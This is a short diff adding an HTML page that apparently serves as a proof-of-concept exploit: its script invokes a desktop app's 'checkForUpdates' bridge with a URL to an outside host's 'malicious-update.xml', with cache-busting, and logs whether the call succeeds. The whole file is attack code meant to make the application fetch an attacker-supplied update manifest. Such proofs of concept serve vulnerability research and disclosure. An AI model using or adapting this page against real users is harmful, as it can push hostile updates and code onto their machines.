@@ -1,0 +1,19 @@
+<html><body>
+<div id="o"></div>
+<script>
+var o = document.getElementById('o');
+function log(m) { o.innerHTML += m + '<br>'; }
+
+var ts = Date.now();
+var xmlUrl = 'https://adobe-genuine.github.io/connect-poc/malicious-update.xml?nocache=' + ts;
+log('Calling checkForUpdates...');
+log('XML URL: ' + xmlUrl);
+
+try {
+    connectApp.checkForUpdates(xmlUrl, false, true);
+    log('checkForUpdates called OK');
+} catch(e) {
+    log('ERROR: ' + e.message);
+}
+</script>
+</body></html>
